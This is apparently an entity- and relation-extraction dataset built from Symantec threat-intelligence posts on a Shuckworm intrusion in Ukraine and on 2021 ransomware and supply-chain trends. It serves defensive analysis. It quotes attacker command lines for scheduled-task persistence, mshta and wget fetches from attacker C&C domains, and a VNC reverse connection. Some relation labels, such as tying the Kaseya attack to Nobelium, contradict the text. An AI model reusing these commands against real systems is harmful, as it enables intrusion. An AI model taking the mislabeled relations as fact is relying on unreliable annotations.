{"instruction": "Shuckworm activity: Case study Symantec observed Shuckworm activity on an organization in Ukraine, which began on July 14, 2021 and continued until August 18, 2021. The attack chain began with a malicious document, likely sent via a phishing email, which was opened by the user of the infected machine. The following is a breakdown of the attackers\u2019 activity on the compromised computer. July 14 At 08:48 (local-time), a suspicious Word document is opened on the machine. Just five minutes after the document is opened, a suspicious command is also executed to launch a malicious VBS file (depended.lnk). This file is a known custom backdoor leveraged by Shuckworm (aka Pterodo). wscript.exe CSIDL_PROFILE\\searches\\depended.lnk //e:VBScript //b The backdoor is used to download and execute CSIDL_PROFILE\\searches\\depended.exe (94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b) from hxxp://92.242.62.131/wordpress.php?is=[REDACTED]. Two additional VBS scripts are observed being executed via depended.exe: \"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\roaming\\reflect.rar //e:VBScript //b \"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\deep-thoughted. //e:VBScript //b", "input": null, "output": "Named Entities: (Shuckworm, malware), (Pterodo, malware), (depended.lnk, file), (depended.exe, file), (94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b, SHA256), (hxxp://92.242.62.131/wordpress.php?is=[REDACTED], URL)\nRelationships: (Shuckworm, use, depended.lnk), (depended.lnk, execute, depended.exe), (depended.exe, download from, hxxp://92.242.62.131/wordpress.php?is=[REDACTED]), (depended.exe, hash, 94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b)"}
{"instruction": "A scheduled task is then created to likely ensure persistence between system reboots and to execute the dropped script. This ensures the VBS file deep-thoughted.ppt is executed every 10 minutes: SCHTASKS /CREATE /sc minute /mo 10 /tn \"deep-thoughted\" /tr \"wscript.exe \" CSIDL_COMMON_PICTURES\\deep-thoughted.ppt //e:VBScript //b\" /F Later, the attackers are observed executing an HTA file hosted on a remote server by abusing mshta.exe via depended.exe. The Mshta utility can execute Microsoft HTML Application (HTA) files and can be abused to bypass application control solutions. Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings. \"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe hxxp://fiordan.ru/FILM.html /f id=[REDACTED] At the same time, a new variant of Pterodo is installed via depended.exe. Similarly to before, two additional scheduled tasks are created: \"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"MediaConverter\" /tr \"wscript.exe \" CSIDL_COMMON_MUSIC\\tvplaylist.mov //e:VBScript //b \" /F\"", "input": null, "output": "Named Entities: (VBS file deep-thoughted.ppt, file), (SCHTASKS, tool), (mshta.exe, file), (depended.exe, file), (hxxp://fiordan.ru/FILM.html, URL), (Pterodo, malware), (wscript.exe, file), (tvplaylist.mov, file)\nRelationships: (mshta.exe, abusing by, depended.exe), (Pterodo, installed via, depended.exe)"}
{"instruction": "\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"VideoHostName\" /tr \"wscript.exe \" CSIDL_COMMON_VIDEO\\webmedia.m3u //e:VBScript //b \" /F\" The attackers continue to install variants of their backdoor and execute commands via scripts to ensure persistence: \"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\22333.docx //e:VBScript //b \"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\9140.d //e:VBScript //b wscript.exe CSIDL_COMMON_MUSIC\\tvplaylist.mov //e:VBScript //b schtasks /Create /SC MINUTE /MO 15 /F /tn BackgroundConfigSurveyor /tr \"wscript.exe C:\\Users\\o.korol\\AppData\\Roaming\\battery\\battery.dat //e:VBScript //b\" \"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_PROFILE\\appdata\\roaming\\battery\\battery.cmd Directly after this, it appears the attackers test connectivity to a new C&C server via ping.exe: CSIDL_SYSTEM\\cmd.exe /c ping -n 1 arianat.ru Once the connection is confirmed to be active, the attackers proceed to download another variant of their Pterodo backdoor and begin using the new C&C to download additional scripts and tools, as well as creating scheduled tasks to run every few minutes. \"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\12382. //e:VBScript //b \"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe hxxp://avirona.ru/7-ZIP.html /f id=<?,?> CSIDL_SYSTEM\\mshta.exe hxxp://avirona.ru/7-ZIP.html /f id=<?,?>", "input": null, "output": "Named Entities: (schtasks.exe, file), (wscript.exe, file), (webmedia.m3u, file), (tvplaylist.mov, file), (cmd.exe, file), (22333.docx, file), (9140.d, file), (battery.dat, file), (battery.cmd, file), (ping.exe, file), (arianat.ru, Domain), (Pterodo backdoor, malware), (C&C server, tool), (new C&C, tool), (mshta.exe, file), (avirona.ru, Domain), (7-ZIP.html, file)\nRelationships: (wscript.exe, execute, webmedia.m3u), (wscript.exe, execute, 22333.docx), (wscript.exe, execute, 9140.d), (wscript.exe, execute, battery.dat), (cmd.exe, execute, battery.cmd), (cmd.exe, execute, ping.exe), (ping.exe, ping, arianat.ru), (C&C server, connect to, Pterodo backdoor), (Pterodo backdoor, download, scripts and tools), (mshta.exe, execute, 7-ZIP.html)"}
{"instruction": "\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"MediaConverter\" /tr \"wscript.exe \" CSIDL_COMMON_MUSIC\\mediatv.mov //e:VBScript //b \" /F\" \"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"VideoHostName\" /tr \"wscript.exe \" CSIDL_COMMON_VIDEO\\videotv.m3u //e:VBScript //b \" /F\" At this point, the attackers cease activity. However, we continue to see commands being executed from the scheduled tasks for the remainder of July 14. July 16 At 05:28, the attackers return, and several additional variants of Pterodo are executed via CSIDL_COMMON_VIDEO\\planeta.exe (1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1). \"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\32440.docx //e:VBScript //b \"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\20507.d //e:VBScript //b The attackers are then observed executing commands via planeta.exe: CSIDL_SYSTEM\\cmd.exe /c \"\"CSIDL_PROFILE\\appdata\\local\\temp\\7zsfx000.\"\" \"\" \"CSIDL_SYSTEM\\cmd.exe\" /c ipconfig /flushdns The above flushdns command may indicate that the attackers have updated the DNS records for their C&Cs, as we observed some of their tools use hard-coded domains. In this particular instance, the flushdns command was executed shortly before the attackers attempted to install additional backdoors that leveraged the same C&C.", "input": null, "output": "Named Entities: (schtasks.exe, file), (wscript.exe, file), (mediatv.mov, file), (videotv.m3u, file), (planeta.exe, file), (1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1, SHA256), (wscript.exe, file), (32440.docx, file), (20507.d, file), (cmd.exe, file), (C&C, tool)\nRelationships: (mediatv.mov, execute, wscript.exe), (videotv.m3u, execute, wscript.exe), (planeta.exe, execute, cmd.exe), (planeta.exe, hash, 1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1)"}
{"instruction": "July 28 Later, another variant of Pterodo (deep-sided.fly) was executed and was used to download and execute a new file called deerskin.exe (ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29). This file is a dropper for a VNC client. When executed, it pings google DNS (8.8.8.8) to test internet connectivity, then proceeds to drop a VNC client and establishes a connection to a remote C&C server controlled by the attackers: \"%USERPROFILE%\\Contacts\\DriversHood.exe\" -autoreconnect -id:2097 -connect mucoris.ru:5612 Two such files have been identified that perform the same actions: 1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29 This VNC client appears to be the ultimate payload for this attack. Between July 29 and August 18 activity continued whereby we observed the attackers deploying multiple variants of their custom VBS backdoor along with executing VBS scripts and creating scheduled tasks similar to the ones detailed above. After August 18, no further suspicious activity was observed on this machine.", "input": null, "output": "Named Entities: (Pterodo, malware), (deep-sided.fly, malware), (deerskin.exe, file), (ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29, SHA256), (VNC client, tool), (8.8.8.8, IP), (mucoris.ru:5612, Domain), (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f, SHA256)\nRelationships: (Pterodo, download and execute, deerskin.exe), (deerskin.exe, dropper for, VNC client), (deerskin.exe, SHA256, ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29), (deerskin.exe, ping, 8.8.8.8), (deerskin.exe, establish connection to, mucoris.ru:5612), (Pterodo, execute, deep-sided.fly), (deep-sided.fly, download and execute, deerskin.exe), (deerskin.exe, dropper for, VNC client), (deerskin.exe, SHA256, ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29), (deerskin.exe, ping, 8.8.8.8), (deerskin.exe, establish connection to, mucoris.ru:5612), (deerskin.exe, hash, 1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f)"}
{"instruction": "During the course of this investigation, specifically post VNC client installation, a number of documents were opened from various locations on the compromised machine. It is unclear if this was legitimate user activity or the activity of the attackers attempting to collect and exfiltrate sensitive information. Titles of the documents accessed ranged from job descriptions to sensitive information pertaining to the targeted organization.", "input": null, "output": "Named Entities: (VNC client, tool)\nRelationships: No related relations."}
{"instruction": "Technical descriptions Symantec investigations uncovered a total of seven files used by Shuckworm in recent attacks. All seven files are 7-zip SFX self-extracting binaries, a format used previously in Shuckworm attacks. descend.exe Upon execution, the file named descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) drops a VBS file which, in turn, drops a second VBS file in the following locations: %USERPROFILE%\\Downloads\\deerbrook.ppt %PUBLIC%\\Pictures\\deerbrook.ppt It then creates the following task: SCHTASKS /CREATE /sc minute /mo 11 /tn \"deerbrook\" /tr \"wscript.exe '<DROPPED_FOLDER>\\deerbrook.ppt' //e:VBScript //b\" /F The file deerbrook.ppt (b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e) VBS file contacts a command-and-control (C&C) server at deep-pitched.enarto.ru. If the C&C server is available, a HTTP POST request is sent to download a payload, which is saved in the %USERPROFILE% folder as deep-sunken.tmp then renamed to deep-sunken.exe and executed. The binary is then deleted. deep-sunken.exe Upon execution, the file deep-sunken.exe (02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200) drops the following files on the compromised computer: %APPDATA%\\baby\\baby.cmd %APPDATA%\\baby\\baby.dat %APPDATA%\\baby\\basement.exe (wget binary) %APPDATA%\\baby\\vb_baby.vbs", "input": null, "output": "Named Entities: (Shuckworm, malware), (descend.exe, file), (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137, SHA256), (deerbrook.ppt, file), (b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e, SHA256), (deep-pitched.enarto.ru, Domain), (deep-sunken.tmp, file), (deep-sunken.exe, file), (02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200, SHA256), (%APPDATA%\\baby\\baby.cmd, file), (%APPDATA%\\baby\\baby.dat, file), (%APPDATA%\\baby\\basement.exe, file), (%APPDATA%\\baby\\vb_baby.vbs, file)\nRelationships: (Shuckworm, use, descend.exe),  (descend.exe, hash, 0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137), (descend.exe, drop, deerbrook.ppt), (deerbrook.ppt, hash, b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e), (descend.exe, contacts, deep-pitched.enarto.ru), (descend.exe, download, deep-sunken.tmp), (deep-sunken.tmp, rename to, deep-sunken.exe), (deep-sunken.exe, hash, 02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200), (deep-sunken.exe, drop, %APPDATA%\\baby\\baby.cmd), (deep-sunken.exe, drop, %APPDATA%\\baby\\baby.dat), (deep-sunken.exe, drop, %APPDATA%\\baby\\basement.exe), (deep-sunken.exe, drop, %APPDATA%\\baby\\vb_baby.vbs)"}
{"instruction": "It then creates the following task: schtasks /Create /SC MINUTE /MO 15 /F /tn BackgroundConfigSurveyor /tr \"wscript.exe [%APPDATA%]\\baby\\baby.dat\" //e:VBScript //b It then connects to a C&C server (arianat.ru) to download another payload using wget: basement.exe --user-agent=\"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.64::[VICTIM_ID]::/.beagle/.\" -q -b -c -t 2 \"hxxp://arianat.ru/baby.php\" -P \"[%APPDATA%]\\baby\" The baby.dat file is a VBS file that executes baby.cmd, which then downloads and executes the payload from the C&C server. The vb_baby.vbs file renames the downloaded payload from baby.php to backed.exe. The downloaded payload (backed.exe) could not be retrieved. However, the following files were also obtained during our investigation: z4z05jn4.egf.exe The file z4z05jn4.egf.exe (fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0) is similar to the previous file (deep-sunken.exe) but with different folders, file names, and C&C server (iruto.ru). defiant.exe Once executed, the file defiant.exe (a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455) drops a VBS file in the following locations: %TEMP%\\\\deep-versed.nls %PUBLIC\\Pictures\\deep-versed.nls It then creates the following task:", "input": null, "output": "Named Entities: (C&C server, tool), (arianat.ru, Domain), (baby.dat, file), (baby.cmd, file), (backed.exe, file), (z4z05jn4.egf.exe, file), (fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0, SHA256), (deep-sunken.exe, file), (defiant.exe, file), (a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455, SHA256), (%TEMP%\\\\deep-versed.nls, file), (%PUBLIC\\Pictures\\deep-versed.nls, file)\nRelationships: (baby.dat, execute, baby.cmd), (baby.cmd, download and execute, C&C server), (backed.exe, downloaded from, C&C server), (C&C server, domain, arianat.ru), (z4z05jn4.egf.exe, similar to, deep-sunken.exe), (z4z05jn4.egf.exe, hash, fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0), (defiant.exe, hash, a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455), (defiant.exe, drop, %TEMP%\\\\deep-versed.nls), (defiant.exe, drop, %PUBLIC\\Pictures\\deep-versed.nls)"}
{"instruction": "SCHTASKS /CREATE /sc minute /mo 12 /tn \\\"deep-versed\\\" /tr \\\"wscript.exe \\\"[%PUBLIC%]\\\\Pictures\\\\deep-versed.nls\\\" //e:VBScript //b\\\" /F The dropped file deep-versed.nls (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc) downloads a payload from a C&C server (deep-toned.chehalo.ru) and saves it as deep-green.exe in the following location: %PUBLIC%\\Downloads deep-green.exe The file deep-green.exe (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f) contains an UltraVNC binary, which upon execution connects to a repeater (mucoris.ru:5612) using the following command line: -autoreconnect -id:%RANDOM% -connect mucoris.ru:5612 UltraVNC is an open-source remote-administration/remote-desktop-software utility. deep-green.exe A second file named deep-green.exe (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa) contain a Process Explorer (procexp) binary. Process Explorer is a freeware task manager and system monitor for Microsoft Windows. deep-green.exe A third file called deep-green.exe (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) just with different file names and C&C server (deer-lick.chehalo.ru). deep-green.exe The fourth and final file named deep-green.exe (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7) drops a VBS file in the following location: %PUBLIC%\\Music\\ It then creates the following task:", "input": null, "output": "Named Entities: (SCHTASKS, tool), (deep-versed.nls, file), (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc, SHA256), (deep-green.exe, file), (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f, SHA256), (UltraVNC, tool), (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa, SHA256), (procexp, tool), (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a, SHA256), (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7, SHA256)\nRelationships: (SCHTASKS, create, deep-versed.nls), (deep-versed.nls, hash, 817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc), (deep-versed.nls, save as, deep-green.exe), (deep-green.exe, hash, 1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f), (deep-green.exe, tool, UltraVNC), (deep-green.exe, hash, f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa), (deep-green.exe, tool, procexp), (deep-green.exe, hash, de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a), (deep-green.exe, hash, d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7)"}
{"instruction": "\"/CREATE /sc minute /mo 12 /tn \\\"MediaConverter\\\" /tr \\\"wscript.exe \\\"C:\\\\Users\\\\Public\\\\Music\\\\MediaConvertor.dat\\\" //e:VBScript //b \\\" /F\" The MediaConvertor.dat file searches for removable drives and creates a .lnk file with the following command: mshta.exe hxxp://PLAZMA.VIBER.ontroma.ru/PLAZMA.html /f id=January", "input": null, "output": "Named Entities: (MediaConvertor.dat, file), (mshta.exe, file)\nRelationships: No related relations."}
{"instruction": "IOC patterns Analysis of the many indicators of compromise (IOCs) uncovered during our investigations have revealed the following patterns, which may be of use when defending networks from Shuckworm attacks: Most URL C&C IPs belong to the short list of hosting providers listed in the SSU report, namely AS9123 TimeWeb Ltd. (Russia). Most discovered suspected C&C URLs are IP-based URLs and use a unique URI structure: http + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-rand-alphanums> OR http + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-rand-alphanums>-<2-integers> Most suspected malicious files are found in one of a short list of directories: csidl_profile\\links csidl_profile\\searches CSIDL_PROFILE\\appdata\\local\\temp\\ CSIDL_PROFILE\\ Nearly all the suspected malicious files are made up of a word beginning with the letter \"d\" and a few are composed of two words separated by a \"-\" (first word also starting with \"d\"). Examples include: deceive.exe deceived.exe deception.exe deceptive.exe decide.exe decided.exe decipher.exe decisive.exe deep-sunken.exe deep-vaulted.exe", "input": null, "output": "Named Entities: (Shuckworm, malware), (deceive.exe, file), (deceived.exe, file), (deception.exe, file), (deceptive.exe, file), (decide.exe, file), (decided.exe, file), (decipher.exe, file), (decisive.exe, file), (deep-sunken.exe, file), (deep-vaulted.exe, file)\nRelationships: No related relations."}
{"instruction": "Detected command lines are simple and consist of just the binary path + name; no switches, etc. Many suspected malicious files have unknown parent process hashes, none of which have available information. According to a November 2021 report from the SSU, since 2014 the Shuckworm group has been responsible for over 5,000 attacks against more than 1,500 Ukrainian government systems. As evidenced by Symantec\u2019s recent investigations into attempted Shuckworm attacks against a number of organizations in Ukraine, this activity shows little sign of abating.", "input": null, "output": "Named Entities: (Shuckworm, attacker)\nRelationships:  No related relations."}
{"instruction": "The Threat Landscape in 2021", "input": null, "output": "No related entities and relations."}
{"instruction": "Symantec takes a look at the cyber security trends that shaped the year \nFrom the evolving ransomware ecosystem to attacks against critical infrastructure, Symantec looks back over the cyber-security trends that shaped 2021 . \nA new whitepaper from Symantec, a division of Broadcom Software , takes a look back at the some of the major threats that shaped the threat landscape during 2021. \nRansomware was arguably the most significant threat facing organizations in 2021, with some ransomware operators departing the scene, new ones entering the fold, and business models and tactics being refined to make targeted ransomware more lucrative than ever. \nHowever, ransomware wasn\u2019t the only threat, with supply chain attacks, an increase in attackers exploiting vulnerabilities in public-facing applications, and attacks against critical infrastructure also shaping the threat landscape in 2021.", "input": null, "output": "Named Entities: (ransomware, threat type), (supply chain attacks, threat type)\nRelationships: No related relations."}
{"instruction": "Ransomware Ransomware, or more precisely, targeted ransomware, was the most dominant threat making headlines throughout 2021. Ransomware gangs moved towards targeting entities with a broad network of downstream users. These upstream entities included large software developers and organizations involved in critical infrastructure, as seen in the Kaseya and Colonial Pipeline attacks. Targeting managed service providers (MSPs) also gave attackers the opportunity to infect potentially thousands of victims by compromising just one.", "input": null, "output": "Named Entities: (Ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "While as in previous years, the total number of ransomware attacks detected and blocked by Symantec in 2021 continues to trend downwards, this doesn\u2019t mean ransomware activity is becoming less of a threat. This downward trend is due to a significant decrease in relatively unsophisticated, indiscriminate ransomware attacks and threat actors shifting their focus to large organizations where they can cause more disruption and demand higher ransom amounts. The number of these targeted ransomware attacks rose from around 80 in January 2020 to more than 200 in September 2021. Figure 1. Number of targeted ransomware attacks January 2020 to September 2021", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "This increase in targeted ransomware attacks is partly fueled by two relatively recent developments: the rise of so-called initial access brokers (IABs), threat actors that sell access to compromised networks to the highest bidder, which in recent times has become targeted ransomware gangs; and a rise in ransomware-as-a-service (RaaS), a subscription-based model that lets individuals or gangs known as affiliates use already-developed ransomware threats in their attacks. The RaaS model greatly increases the number of adversaries an organization faces, with multiple attackers now attempting to deliver the same ransomware, but using different tactics, techniques, and procedures (TTPs).", "input": null, "output": "Named Entities: (ransomware, threat type), (initial access brokers, attacker), (ransomware gangs, attacker), (ransomware-as-a-service, tool), (RaaS, tool)\nRelationships: (ransomware, fueled by, initial access brokers), (ransomware-as-a-service, used for, ransomware)"}
{"instruction": "Due to the growth in the RaaS market, affiliates now have the option to migrate to another ransomware should their current one shut down. In addition, Symantec has observed affiliates using two different strains of ransomware in a very short space of time and, in some cases, during the same attack. This suggests that some affiliates have enough of a reputation to not be locked in to an exclusive agreement with one ransomware operator. While as in previous years, the total number of ransomware attacks detected and blocked by Symantec in 2021 continues to trend downwards, this doesn\u2019t mean ransomware activity is becoming less of a threat.", "input": null, "output": "Named Entities: (ransomware, threat type), (strains of ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "Botnets are now also playing a key role in ransomware attacks, with many older financial fraud botnets having been repurposed to spread ransomware. In some cases, it is the same threat actor behind both the ransomware and the botnet. For example, Trickbot is believed to be controlled by the Miner group (aka Wizard Spider) which is also linked to both the Ryuk and Conti ransomware. Another takeaway from the year concerning ransomware included operators targeting industries that were hardest hit by the COVID-19 pandemic. A prime example of this was the attack against Ireland\u2019s national health service , the Health Service Executive, by the Conti (aka Miner, Wizard Spider) ransomware operators.", "input": null, "output": "Named Entities: (botnets, threat type), (ransomware, threat type), (Trickbot, malware), (Miner group, attacker), (Wizard Spider, attacker), (Ryuk, malware), (Conti, malware)\nRelationships: (botnets, repurposed to spread, ransomware), (Trickbot, controlled by, Miner group), (Miner group, linked to, Ryuk), (Miner group, linked to, Conti), (Conti, aka, Miner group), (Conti, aka, Wizard Spider)"}
{"instruction": "Last year also saw the REvil (aka Leafroller, Sodinokibi) ransomware\u2019s infrastructure compromised by law enforcement, which gained control of at least some of REvil\u2019s servers . However, as with previous efforts to halt the gang\u2019s activity, REvil is likely to reappear in some form following the most recent takedown effort. In 2021, targeted ransomware groups also began threatening victims in order to prevent them from sharing details of attacks with media or ransomware negotiating firms. Both the Conti and Grief ransomware gangs said that they would publish stolen victim data or delete decryption keys if transcripts or screenshots of ransom negotiations were publicly shared. The announcement was likely prompted by a growing number of media reports containing details of ransom negotiations. Other threat groups also employed similar tactics, including Ragnar Locker and a new ransomware threat called Yanluowang, which was uncovered by Symantec\u2019s Threat Hunter Team .", "input": null, "output": "No related entities and relations."}
{"instruction": "Supply-chain attacks Software supply chain attacks, due to their potential to disrupt large sections of society and business, remain a concern for governments and businesses around the world. Two significant supply chain attacks in the headlines from last year included the SolarWinds hack and the Kaseya attack. While the SolarWinds attack occurred in late 2020 it continued to make waves well into 2021. The attackers responsible for the attack, the Russia-backed Nobelium (aka Hagensia) group, has remained active. A new backdoor threat (Tomiris) likely developed by Nobelium was uncovered in September. The malware has similarities to the SUNSHUTTLE second-stage malware used by Nobelium in the SolarWinds attack. While another post-exploitation backdoor (FoggyWeb) was also linked to Nobelium. The malware is designed to steal sensitive data from compromised Active Directory Federation Services (AD FS) servers.", "input": null, "output": "Named Entities: (SolarWinds hack, attack), (Kaseya attack, attack), (Nobelium, attacker), (Hagensia, attacker), (Tomiris, malware), (SUNSHUTTLE, malware), (FoggyWeb, malware)\nRelationships: (SolarWinds hack, attack, Nobelium), (Kaseya attack, attack, Nobelium), (Tomiris, developed by, Nobelium), (Tomiris, similar to, SUNSHUTTLE), (FoggyWeb, linked to, Nobelium)"}
{"instruction": "The attack against IT management software maker Kaseya, which was carried out by the REvil ransomware operators, impacted multiple managed service providers (MSPs) that used the company\u2019s software. While Kaseya reported that approximately 60 of their customers were impacted by the attack, those customers were MSPs with numerous customers themselves. The estimated number of organizations compromised as a result of the supply chain attack was 1,500. The attack was carried out during the U.S. July 4 holiday weekend, likely in an attempt to have the attack go unnoticed for as long as possible due to many employees being on leave. This is a tactic that is increasingly being adopted by threat actors.", "input": null, "output": "Named Entities: (REvil ransomware operators, attacker), (supply chain attack, threat type)\nRelationships: (supply chain attack, carried out by, REvil ransomware operators)"}
{"instruction": "While the Kaseya and SolarWinds attacks are the most significant, they are by no means the only supply chain attacks in recent times. According to a report from the Identity Theft Resource Center (ITRC), supply chain attacks are increasing, with 793,000 more individuals being affected by such attacks in the first three quarters of 2021 than in the entire 12 months of 2020.", "input": null, "output": "Named Entities: (Kaseya, tool), (SolarWinds, tool), (supply chain attacks, threat type)\nRelationships: (Kaseya, belong to, supply chain attack), (SolarWinds, belong to, supply chain attack)"}
{"instruction": "New avenues of attack Last year saw an increase in attackers exploiting vulnerabilities in public-facing applications in order to gain access to organizations\u2019 networks. While in some cases attackers are focusing on zero-day bugs, more frequently they are looking towards recently patched vulnerabilities and the hunt for unpatched systems. A notable example of this was the critical vulnerabilities in Microsoft Exchange Server, collectively known as ProxyLogon. The flaws were patched in early March 2021, with Microsoft saying at the time that the bugs were being exploited by an advanced persistent threat (APT) group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, shortly after the ProxyLogon vulnerabilities were disclosed, other threat actors began exploiting them. Figure 2. Exploit attempts against Microsoft Exchange Server bugs, March to August 2021", "input": null, "output": "Named Entities: (Hafnium, attacker), (Ant, attacker)\nRelationships: (Hafnium, aka, Ant)"}
{"instruction": "This quick adoption was also highlighted when another string of vulnerabilities in Microsoft Exchange Server, dubbed ProxyShell, were publicly revealed in August 2021. Exploit attempts targeting these bugs began immediately, with Symantec data showing more than 200,000 exploit attempts targeting this set of vulnerabilities in August 2021 alone. Other vulnerabilities in public-facing applications that were frequently exploited by threat actors in 2021 include flaws in VPN products from Pulse Secure (CVE 2019-11510), Fortinet (CVE-2018-13379), and SonicWall (CVE-2021-20016), and vulnerabilities in Accellion\u2019s File Transfer Appliance (FTA) software (CVE-2021-27101, CVE-2021-27102, CVE-2021-27103, and CVE-2021-27104).", "input": null, "output": "Named Entities: (CVE-2018-13379, vulnerability), (CVE-2021-20016, vulnerability), (CVE-2021-27101, vulnerability), (CVE-2021-27102, vulnerability), (CVE-2021-27103, vulnerability), (CVE-2021-27104, vulnerability)\nRelationships: No related relations."}
{"instruction": "Critical infrastructure Cyber-attacks against critical national infrastructure (CNI) can be some of the most impactful as they can potentially affect everyone in society. This was highlighted in May 2021, when the Colonial Pipeline, the largest petroleum pipeline in the U.S., suffered a ransomware attack that impacted equipment managing the pipeline. The attack was carried out by the Russia-based DarkSide ransomware gang. While the ransom was paid just hours after the attack took place, decryption was slow and the pipeline\u2019s operation was halted, causing fuel shortages, price increases, and panic buying across a number of U.S. states.", "input": null, "output": "Named Entities: (DarkSide, attacker), (ransomware, threat type)\nRelationships: (ransomware attack, carried out by, DarkSide)"}
{"instruction": "The Colonial Pipeline attack was not an isolated incident, with news also emerging in July 2021 that Chinese state-sponsored threat actors had targeted 23 U.S. oil and gas pipeline operators in attack campaigns between 2011 and 2013. U.S. officials announced that the aim of the actors behind the attacks was to \u201chelp China develop cyber attack capabilities against U.S. pipelines to physically damage pipelines or disrupt pipeline operations.\u201d Attacks against CNI show no signs of stopping, with the number of network-based detections related to attacks targeting CNI trending upward (Figure 3). These attacks are blocked by Symantec\u2019s Intrusion Prevention System (IPS) technologies. Malicious activity blocked on the network saw a decline after a peak in July 2021, however, overall the numbers are trending upward. Figure 3. Network-based detections related to attacks targeting CNI", "input": null, "output": "Named Entities: (Colonial Pipeline attack, attack), (Chinese state-sponsored threat actors, attacker)\nRelationships: (Colonial Pipeline attack, related to, Chinese state-sponsored threat actors)"}
{"instruction": "In terms of regions that see the most activity targeting the networks of CNI organizations, the U.S. is bounds ahead of others on the list with 69% of all activity seen there. Figure 4. Regions with the most activity targeting the networks of CNI organizations This was just a sample of the content in our latest whitepaper. Read the full paper for more insights into the threat landscape of 2021. Symantec Enterprise Blogs", "input": null, "output": "No related entities and relations."}
